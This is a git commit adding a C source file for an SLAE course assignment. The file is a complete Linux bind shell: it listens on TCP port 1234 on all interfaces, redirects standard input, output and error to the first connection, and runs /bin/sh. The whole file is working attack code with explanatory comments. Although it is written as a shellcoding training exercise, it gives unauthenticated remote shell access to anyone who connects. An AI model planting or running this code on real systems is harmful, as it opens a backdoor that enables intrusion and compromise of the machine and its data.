479a1f9100bc4392a50508ddd6ca668523c53f4f
sandh0t <45873960+sandh0t@users.noreply.github.com>
2018-12-14 12:22:13 +0100

    Create Bind_Shell_TCP.c

---
+++ Assignment_1/Bind_Shell_TCP.c
@@ -0,0 +1,50 @@
+// SLAE Assignment #1: Shell Bind TCP (Linux/x86) 
+// Author:   Ayoub Safa (@)
+// Website:  http://blog.jsiob.com
+// SLAE-ID: 1400
+ 
+ 
+#include <stdio.h> 
+#include <sys/types.h>  
+#include <sys/socket.h> 
+#include <netinet/in.h> 
+ 
+int host_sockid;   	// socket file descriptor 
+int client_sockid;	// client file descriptor 
+ 
+struct sockaddr_in hostaddr;		// server aka listen address
+ 
+int main() 
+{ 
+	// Create new TCP socket 
+	// AF_INET for IPv4
+	// SOCK_STREAM for TCP connection
+	// 0 leaves it up to the service provider for protocol, which will be TCP
+	host_sockid = socket(PF_INET, SOCK_STREAM, 0); 
+ 	
+	// Initialize sockaddr struct to bind socket using it 
+	hostaddr.sin_family = AF_INET; 	// server socket type address family = internet protocol address
+    hostaddr.sin_port = htons(1234); 	// server port, converted to network byte order
+    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);		// listen to any address, converted to network byte order
+ 
+    // Bind socket to IP/Port in sockaddr struct 
+    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 
+ 
+    // Listen for incoming connections 
+    listen(host_sockid, 2); 
+ 
+    // Accept incoming connection 
+    client_sockid = accept(host_sockid, NULL, NULL); 
+ 
+    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
+    dup2(client_sockid, 0); 
+    dup2(client_sockid, 1); 
+    dup2(client_sockid, 2); 
+ 
+    // Execute /bin/sh 
+    execve("/bin/sh", NULL, NULL); 
+    close(host_sockid); 
+ 
+    return 0; 
+
+}
